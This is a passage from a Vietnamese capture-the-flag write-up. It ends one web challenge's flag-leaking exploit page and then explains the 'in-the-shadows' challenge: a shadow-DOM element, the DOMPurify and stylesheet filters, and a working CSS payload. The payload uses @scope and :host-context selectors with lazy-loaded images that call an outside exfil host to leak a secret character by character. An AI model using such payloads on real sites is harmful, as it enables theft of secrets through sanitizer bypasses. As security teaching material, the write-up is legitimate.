          if (e.data?.flag) {
            console.log(e.data.flag);
            location = 'about:blank#' + e.data.flag.split(';')[0];
          }
        }
      })();
  
  
  
    </script>
  
  </body>
```

Tuy nhiên nếu bạn chạy exploit này trên Chrome, flag sẽ không được trả về, đó là vì đối với blob origin, ta sẽ không thể set cookie được 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c85bb834-c065-47a9-833a-094e82d9566c)

Tuy nhiên đối với Firefox thì khác

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e37b739b-57ba-464c-ad3e-4a3d6c962b77)

Và khi report `exploit.html` cho bot thì ta sẽ có flag thông qua thông báo lỗi trả về 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/253ff2fc-d054-4e7f-b468-507b851566b3)

## IN-THE-SHADOWS 

Goal của bài là ta cần tìm cách truy cập được vào endpoint `check-secret` cùng với một admin secret hợp lệ nhằm có được flag. Ta thấy secret được render trong body, tuy nhiên admin secret thì chỉ được render nếu ta có được admin cookie hợp lệ

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/838d4472-c3cd-48c8-8248-942b4d7094c9)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2297f97c-08c1-46c0-aff3-bea9025c830b)


Ở bài này ta sẽ có thể nhập vào một nội dung bất kì, sau đó nội dung này sẽ được đưa vào một shadow DOM được attach với một custom element là `UntrustedContentElement`.

```js
class UntrustedContentElement extends HTMLElement {
  static get observedAttributes() {
    return ["html"];
  }

  constructor() {
    super();
    this._shadow = this.attachShadow({ mode: "closed" });
  }

  get html() {
    return this.getAttribute("html") ?? "";
  }

  set html(val) {
    this.setAttribute("html", val);
  }

  attributeChangedCallback(name, oldValue, newValue) {
    if (name === "html") {
      this._shadow.replaceChildren(sanitize(newValue));
    }
  }
}

customElements.define("untrusted-content", UntrustedContentElement);
```

Trước khi nội dung được đưa vào shadow DOM thì nó sẽ đi qua DOMPurify, config của DOMPurify như sau:
```js
const DOMPURIFY_CONFIG = {
  RETURN_DOM_FRAGMENT: true,
  FORCE_BODY: true,
  FORBID_ATTR: ["name", "id"],
  FORBID_TAGS: ["template", "svg", "math", "xmp", "textarea"],
  USE_PROFILES: { html: true },
};
```

Ta có 2 phần cần chú ý:
- `FORBID_ATTR: ["name", "id"]` chặn các attribute như `id`, `name`
- `FORBID_TAGS: ["template", "svg", "math", "xmp", "textarea"]` chặn các tag `template`, `svg`, `math`, `xmp`, `textarea`, hầu như là các tag dùng trong mutation XSS

Đồng thời author cũng setup một hook cho DOMPurify để handle các `style` element:

```js
DOMPurify.addHook("uponSanitizeElement", (node, data) => {
  if (data.tagName === "style") {
    node.textContent = sanitizeStyleSheet(node.textContent);
  }
});
```

Đối với `style` element thì:
- không được chứa `@import` hoặc `url(`
- Sau khi parser bằng `CSSStyleSheet`, không được dùng các rules: import, media, font face, @layer, ...
- Trong phần selector của rule không được sử dụng `:`

Ở bài này thì mình thấy có khá nhiều hướng giải, mình sẽ trình bày về 1 hướng unintended và hướng intended

### Unintended - lazy loading

Trước khi nhìn vào writeup thì đây cũng là hướng mình dùng, ta có thể chèn tag `img` vào, cho nó lazy load, ẩn nó đi với `style="display: none"` và khi một rule dùng để exfiltrate thỏa điều kiện, ta sẽ set lại style cho `img` đó thành `display: block !important`. Vậy làm sao để select đến `body` từ bên trong shadow DOM? Ta có thể dùng `:host-context` (https://developer.mozilla.org/en-US/docs/Web/CSS/:host-context) để select đến tag `body` và exfiltrate từ từ bằng cách filter theo attribute (`:host-context(body[secret^="0"])`), nhưng có một vấn đề đó là ta sẽ không thể dùng dấu `:` trong selector. Theo như solution của **@rebane2001**, khi dùng `@scope(:host-context(body[secret^="0"]))` thì `rule.selectorText` sẽ là `undefined`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/98b83fd5-bf2c-4d85-87d7-1b79c7071f3a)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/73034a57-bf9a-4748-88ba-01ef6499dea2)

Từ đó ta bypass được hàm `shouldDeleteRule`, exploit sẽ như sau:

```html
<style>
.hide {
	display: none;
}

@scope(:host-context(body[secret^="0"])) {
	.exfil0 { display: block !important; }

}

@scope(:host-context(body[secret^="1"])) {
	.exfil1 { display: block !important; }

}

@scope(:host-context(body[secret^="00"])) {
	.exfil00 { display: block !important; }

}

...

</style>

<img src="http://exfil/0.jpg" class="hide exfil0" loading="lazy">
<img src="http://exfil/1.jpg" class="hide exfil1" loading="lazy">
<img src="http://exfil/00.jpg" class="hide exfil00" loading="lazy">

...

```

### Intended - Chromium bug 

Phần này chắc mình sẽ reference đến writeup của tác giả do ~mình lười~ nó cũng đã khá đầy đủ: https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows
